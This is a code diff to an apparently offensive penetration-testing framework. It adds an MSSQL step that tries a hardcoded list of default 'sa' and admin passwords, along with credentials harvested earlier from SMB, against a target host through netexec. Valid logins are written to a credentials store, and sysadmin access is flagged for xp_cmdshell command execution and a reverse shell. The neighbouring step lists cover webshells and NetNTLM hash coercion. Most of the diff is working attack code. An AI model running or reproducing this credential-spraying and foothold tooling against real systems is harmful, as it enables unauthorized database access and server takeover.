@@ -2290,6 +2290,16 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
         return None
 
+    # 2bn) mssql-creds: sa/default/reused login → DB access (sysadmin = command exec)
+    if sid == "mssql-creds":
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        admin = any("sysadmin" in h for h in hits)
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL" if admin else "HIGH",
+                "summary": f"MSSQL creds: {shown}"[:140]}
+
     # 2bm) mssql-banner: unauthenticated version disclosure (info)
     if sid == "mssql-banner":
         mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
@@ -3398,7 +3408,7 @@ _EXPLOIT_STEPS = {
     ],
     "mssql": [
         ("Banner: SQL Browser (1434) / TDS pre-login → version + instance", "mssql-banner"),
-        "Try sa with blank / default, then known creds (impacket mssqlclient / netexec mssql)",
+        ("sa blank/default + reused creds (netexec mssql); flags sysadmin", "mssql-creds"),
         "Enable & use xp_cmdshell for OS command execution → reverse shell",
         "Enumerate linked servers; EXECUTE AS / trustworthy DB for privilege abuse",
         "Coerce the service account's NetNTLM hash (xp_dirtree / xp_fileexist) → crack / relay",
@@ -13276,6 +13286,114 @@ def _tool_mssql_banner(ip: str, port: int, proto: str) -> str:
     return f"MSSQL banner — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── MSSQL step 2: sa blank/default + reused creds (netexec mssql, SQL auth) ─────
+_MSSQLCREDS_DEADLINE = 120
+_MSSQLCREDS_MAX = 50
+_MSSQL_DEFAULTS = [
+    ("sa", ""), ("sa", "sa"), ("sa", "password"), ("sa", "Password1"), ("sa", "P@ssw0rd"),
+    ("sa", "sql"), ("sa", "sa123"), ("sa", "admin"), ("sa", "sqlserver"), ("sa", "changeme"),
+    ("admin", "admin"), ("sql", "sql"), ("mssql", "mssql"), ("sqladmin", "sqladmin"),
+]
+
+
+def _mssql_nxc_auth(ip: str, port: int, user: str, pw: str) -> "tuple | None":
+    """Auth check via netexec mssql (SQL/local auth). Returns (valid, is_sysadmin) or None if
+    netexec is absent."""
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        return None
+    try:
+        p = subprocess.run([nxc, "mssql", ip, "--port", str(port), "-u", user, "-p", pw,
+                            "--local-auth"], capture_output=True, text=True, timeout=45)
+        out = re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
+    except (OSError, subprocess.SubprocessError):
+        return None
+    valid = bool(re.search(r"\bMSSQL\b.*\[\+\]", out))
+    return (valid, "Pwn3d!" in out)
+
+
+def _gather_mssql_creds(ip: str) -> list:
+    """(user, pass) MSSQL logins mssql-creds proved for this host ('mssql on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ mssql on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _gather_mssql_admin(ip: str) -> list:
+    """(user, pass) MSSQL logins proven sysadmin (can xp_cmdshell) — 'mssql-admin on <ip>'."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ mssql-admin on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _tool_mssql_creds(ip: str, port: int, proto: str) -> str:
+    """MSSQL step 2 tool: try sa with a blank/default password plus a curated set of SQL logins and
+    any harvested password (reuse) via netexec mssql (SQL auth) — targeted, not a wordlist brute.
+    netexec flags sysadmin logins (Pwn3d!) that can run xp_cmdshell. Valid logins are saved to the
+    store ('mssql on <host>', and 'mssql-admin on' when sysadmin). No netexec → raises. Authorised
+    targets only."""
+    import time
+    if not (shutil.which("netexec") or shutil.which("nxc")):
+        raise RuntimeError("netexec (nxc) required to test MSSQL creds")
+
+    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    candidates, seen = [], set()
+    for u, p in _MSSQL_DEFAULTS + reused:
+        key = (u.lower(), p)
+        if key not in seen:
+            seen.add(key)
+            candidates.append((u, p, (u, p) not in _MSSQL_DEFAULTS))
+    candidates = candidates[:_MSSQLCREDS_MAX]
+
+    deadline = time.time() + _MSSQLCREDS_DEADLINE
+    valid, conn_err = [], 0
+    for user, pw, is_reused in candidates:
+        if time.time() > deadline:
+            break
+        r = _mssql_nxc_auth(ip, port, user, pw)
+        if r is None:
+            conn_err += 1
+            if conn_err >= 3:
+                raise RuntimeError("netexec mssql not returning results (down / wrong port?)")
+            continue
+        ok, admin = r
+        if ok:
+            valid.append((user, pw, is_reused, admin))
+            if admin:
+                break                                        # a sysadmin login is the jackpot — stop
+
+    if valid:                                                # persist to the canonical creds store
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for user, pw, _r, admin in valid:
+            for tag in (["mssql"] + (["mssql-admin"] if admin else [])):
+                line = f"! {user}:{pw or '<blank>'} @ {tag} on {ip} [{ip}]"
+                blocks.setdefault(ip, [])
+                if line not in blocks[ip]:
+                    blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(candidates)} cred(s) tried (defaults + reuse) · {len(valid)} valid"]
+    for user, pw, is_reused, admin in valid:
+        tag = "  (sysadmin — xp_cmdshell!)" if admin else ("  (reused)" if is_reused else "")
+        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}{tag}")
+    if any(a for *_x, a in valid):
+        lines.append("· sysadmin → command exec (mssql-exec r3), then spawn-shell (r1)")
+    elif valid:
+        lines.append("· valid but not sysadmin — enum/loot (r4); try to escalate (EXECUTE AS / linked servers)")
+    else:
+        lines.append("· no default/reused login worked — domain creds? try Windows auth manually (mssqlclient)")
+    return f"MSSQL credentials — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -13425,6 +13543,7 @@ _STEP_TOOLS = {
     "mysql-shell": ("MySQL foothold → reverse shell via the OUTFILE webshell (spawned)", _tool_mysql_shell),
     "mysql-next": ("manual MySQL steps (context-aware, reference only)", _tool_mysql_next),
     "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
+    "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -13514,6 +13633,7 @@ _STEP_TOOL_RUNS = {
     "mysql-shell":      ("Python (smart listener)", None),
     "mysql-next":       ("reference · no scan", None),
     "mssql-banner":     ("Python (stdlib) + searchsploit", None),
+    "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
     "spawn-shell":      ("router → service foothold", None),
 }
 
